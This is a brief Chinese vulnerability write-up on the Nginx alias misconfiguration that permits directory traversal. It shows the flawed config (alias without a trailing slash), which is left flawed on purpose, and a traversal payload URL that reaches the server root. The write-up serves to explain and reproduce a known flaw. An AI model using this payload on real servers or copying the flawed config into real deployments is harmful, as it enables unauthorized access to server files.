# Nginx 配置错误漏洞 目录穿越漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3042](https://www.zhihuifly.com/t/topic/3042)

# Nginx 配置错误漏洞 目录穿越漏洞

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

Nginx在配置别名（Alias）的时候，如果忘记加`/`，将造成一个目录穿越漏洞。

错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：

```
location /files {
    alias /home/;
} 
```

Payload: `http://www.0-sec.org:8081/files../` ，成功穿越到根目录：

![image](img/7f193830811532424f5a31b333dfa09d.png)